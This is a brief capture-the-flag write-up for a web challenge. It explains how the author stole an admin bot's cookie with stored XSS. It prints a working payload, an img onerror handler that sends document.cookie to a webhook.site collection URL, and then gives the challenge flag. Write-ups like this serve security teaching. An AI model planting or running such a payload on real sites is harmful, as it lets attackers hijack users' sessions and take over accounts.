> # WEB - 150
>
> Bill gates approves this design

## Writeup

Get a dummy server here or anything to listen for requests
![https://webhook.site/]

Add xss script to the form data
`<img src=x onerror="this.src='https://webhook.site/3dfcb0ae-77ef-40f3-b844-154f74b62185/?'+document.cookie; this.removeAttribute('onerror');">`

Cronjob/admin is set to load the admin page every minute. Triggers the script and will send a request with the cookie as parameter to the server.

Connect to the server cat/vim/nano flag.txt

`UiTHack23{xxspl0its_4r3_phun}`
